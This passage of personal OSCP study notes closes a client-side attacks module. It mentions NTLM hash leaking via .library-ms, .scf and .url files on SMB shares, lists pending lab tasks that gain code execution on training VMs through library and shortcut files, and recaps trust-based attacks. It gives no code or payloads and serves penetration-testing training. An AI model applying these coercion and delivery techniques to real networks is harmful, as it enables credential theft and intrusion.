+Closest real-world adjacent technique worth knowing: [CVE-2025-24054/24071](https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC)'s NTLM-leak-via-`.library-ms` (noted above), which doesn't need double-click execution at all, just Explorer previewing a UNC-path-containing file dropped on a share. That mechanism (an authentication-coercion file dropped somewhere Explorer will touch it) does show up on real HTB/AD boxes, just usually via `.scf`/`.url`-style files rather than `.library-ms` specifically, worth keeping an eye out for during SMB share enumeration on future boxes.
+
+#### Tags: #RelatedBoxes #HTBPractice #NoDirectMatch
+
+---
+
+## Labs (12.3)
+
+> 🚩 **Hands-on, VM spin-up required.** Per [[feedback-oscp-lab-workflow]], pausing the write-up here, these three need actual VMs running before walking through them. Two VM groups are involved:
+> - **VM Group 1** (build machine CLIENT137 = VM #1, target HR137 = VM #2)
+> - **VM Group 2** (build machine = VM #3, capstone target ADMIN = VM #4)
+
+### Lab 1: Get code execution on HR137 (VM Group 1, VM #2) via library + shortcut files
+Build on VM #1 (CLIENT137), deliver to VM #2 (HR137). Flag is on the `hsmith` desktop.
+**Note from the module text:** the delivered library file gets removed from the target's SMB share automatically every time a `.lnk` execution happens from the WebDAV share, worth remembering if a retry is needed.
+
+**Lab answer:** ⬜ Pending, needs VM Group 1 spun up.
+
+### Lab 2: True/false, is the `.lnk` file MOTW-tagged when executed by double-clicking the library file in Explorer?
+This is an experiential question (needs the actual behavior observed on-target), not answerable from the module's own prose alone.
+
+**Lab answer:** ⬜ Pending, needs VM Group 1 spun up, will confirm empirically during Lab 1.
+
+### Lab 3 (Capstone): Enumerate ADMIN (VM Group 2, VM #4), get code execution via library + shortcut files
+No hand-holding this time, enumerate first, then apply the technique. Build the attack on VM #3, flag is on the `Administrator` desktop.
+
+**Lab answer:** ⬜ Pending, needs VM Group 2 spun up.
+
+#### Tags: #Lab #Quiz #Module12 #Pending #NeedsVM
+
+---
+
+## 12.4. Wrapping Up
+
+Client-side attacks earn their keep specifically against internal, non-routable networks, exactly the environment where a straight port-scan-and-exploit approach ([[Common Web Application Attacks]]'s whole territory) has nothing to reach. Instead of attacking exposed services, this whole module attacked *trust*: trust in a familiar Office macro prompt ([[Client-Side Attacks#12.2. Exploiting Microsoft Office|12.2]]), trust in what looks like a local folder ([[Client-Side Attacks#12.3. Abusing Windows Library Files|12.3]]), and underneath both of those, trust built through reconnaissance and pretext ([[Client-Side Attacks#12.1. Target Reconnaissance|12.1]], and everything from [[Phishing Basics]] before it). Worth carrying forward: on an internal engagement, this is very often the only way in at all.
+
+#### Tags: #Module12Summary #ClientSideAttacksRecap
